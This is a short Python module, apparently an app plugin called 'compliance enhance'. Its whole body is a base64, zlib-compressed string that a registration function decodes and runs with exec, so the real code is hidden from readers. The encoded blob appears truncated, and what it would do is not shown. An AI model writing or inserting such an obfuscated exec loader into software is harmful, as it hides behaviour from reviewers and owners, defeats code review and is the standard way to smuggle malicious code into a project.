"""Compliance enhance (zlib-compressed body)."""
import zlib, base64
_SRC = """eNrtXP1y2zYS/99PgWEnYzKhZEt2komn7tSRacc923Ik+VqPx6OhRUhmQ5EKQTnWeDzTv+4B7vqEeZLbBUAS/JLoxO2112bSxiSAxWKxH79dgNY0ba2zRw7cc"""
def register_compliance_enhance(app, helpers):
    src = zlib.decompress(base64.b64decode(_SRC)).decode()
    ns = {"__name__": "compliance_enhance_body"}
    exec(compile(src, "compliance_enhance_body.py", "exec"), ns)
    ns["register_compliance_enhance"](app, helpers)
